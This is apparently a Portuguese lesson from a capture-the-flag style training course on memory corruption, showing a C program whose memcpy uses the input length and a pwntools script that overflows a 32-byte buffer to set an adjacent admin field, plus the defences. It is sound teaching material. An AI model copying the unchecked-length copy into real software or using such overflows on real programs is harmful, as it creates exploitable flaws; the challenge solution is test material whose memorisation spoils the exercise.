# Corrupcao de memoria: variavel adjacente

Aqui comeca o bloco de **corrupcao de memoria**. Nos modulos 1 a 7 o harness
executava seus bytes de proposito. Agora o programa tem uma **vulnerabilidade
real**: ele confia no tamanho da sua entrada.

Esta e a primitiva mais basica. Voce nao vai controlar o fluxo de execucao ainda;
vai apenas sobrescrever uma variavel que fica ao lado do buffer na memoria.

## O programa vulneravel

O codigo-fonte esta em `/challenge/vuln.c`. O trecho central:

```c
struct state {
    char name[32];
    volatile unsigned long admin;   /* fica logo depois de name */
    char tail[64];
};
...
memcpy(st.name, data, n);           /* n = tamanho do arquivo, nao de name! */
```

`name` tem 32 bytes. `admin` vem logo depois, na memoria. Como o `memcpy` usa o
tamanho do arquivo (`n`), se voce enviar mais de 32 bytes, os bytes 33 em diante
caem sobre `admin`. O programa so imprime `VAR_ADJ_OK` se `admin == 0x1337`.

## O que voce precisa fazer

Montar um `payload.bin` com:

- **32 bytes** de preenchimento (para encher `name`), seguidos de
- **8 bytes** com o valor `0x1337` em little-endian (para cair exatamente sobre `admin`).

```python
from pwn import p64

payload  = b"A" * 32            # enche name[32]
payload += p64(0x1337)          # sobrescreve admin
open("/home/hacker/payload.bin", "wb").write(payload)
```

`p64` grava o inteiro em little-endian (8 bytes), que e como o x86-64 guarda um
`unsigned long` na memoria.

## Fluxo completo

```bash
python3 /home/hacker/solve.py
wc -c /home/hacker/payload.bin      # deve dar 40 bytes
/challenge/check
```

O checker compila `vuln.c` com `-fno-stack-protector -no-pie` (protecoes de pilha
desligadas, como no roteiro), executa o programa com o seu payload e procura
`VAR_ADJ_OK`.

## Por que isto importa

Em um programa real, "a variavel ao lado" pode ser uma flag de autenticacao, um
limite de tamanho ou um ponteiro. A defesa correspondente e nunca copiar usando o
tamanho da entrada: usar o tamanho do destino (`sizeof`), funcoes com limite e
stack canaries, que detectam a sobrescrita.
